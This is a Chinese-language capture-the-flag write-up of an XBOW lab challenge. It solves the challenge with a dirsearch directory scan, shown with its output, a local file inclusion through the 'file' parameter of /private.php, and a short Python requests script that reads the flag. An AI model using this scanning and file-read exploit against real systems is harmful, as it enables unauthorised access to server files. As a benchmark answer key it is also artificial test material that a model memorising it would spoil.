# X-098-24
## 题目描述

> Our company XBOW has released a new website. It is super secure :)

## 知识点

本地文件读取（LFI）

## 解题思路

使用 dirsearch 进行目录扫描得到 `/Dockerfile`、`/private.php` 等路径，由 `/Dockerfile` 可知 flag 在 `xbow-flag.txt` 中。

访问 `/private.php` 没有看到任何内容，对其进行参数遍历发现存在 `file` 参数，将 `xbow-flag.txt` 传给 `file` 参数得到 flag。

## 解题步骤

1. 使用 dirsearch 进行目录扫描：
```shell
dirsearch -u http://ip32851

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12292

Target: http://ip32851/

[14:42:37] Scanning:
[14:42:43] 200 -    4KB - /about.php
[14:42:49] 200 -    1KB - /contact.php
[14:42:50] 200 -   426B - /Dockerfile
[14:42:51] 302 -     0B - /home.php  ->  index.php
[14:42:51] 403 -   281B - /images/
[14:42:51] 301 -   324B - /images  ->  http://ip32851/images/
[14:42:52] 200 -    5KB - /index.php
[14:42:52] 200 -    5KB - /index.php/login/
[14:42:53] 200 -    1KB - /login.php
[14:42:56] 200 -   758B - /private.php
[14:42:56] 200 -   758B - /private
[14:42:57] 403 -   281B - /server-status
[14:42:57] 403 -   281B - /server-status/
```
2. 访问 `/Dockerfile`：
![image.png](https://x/x12145040063.png)
得到 flag 路径。
3. 访问 `/private.php`，通过 GET 传参 `file=xbow-flag.txt`：
![image.png](https://x/x12145206680.png)
得到 flag。
## EXP
```python
import requests

base = "http://ip32851"

r1 = requests.get(f"{base}/private.php", params={"action": 1})
print("[+] list status:", r1.status_code)

r2 = requests.get(f"{base}/private.php", params={"file": "xbow-flag.txt"})
print("[+] read status:", r2.status_code)

text = r2.text
start = text.find("<pre>")
end = text.find("</pre>")
flag = text[start+5:end].strip() if start != -1 and end != -1 else text
print("[+] flag:", flag)
```
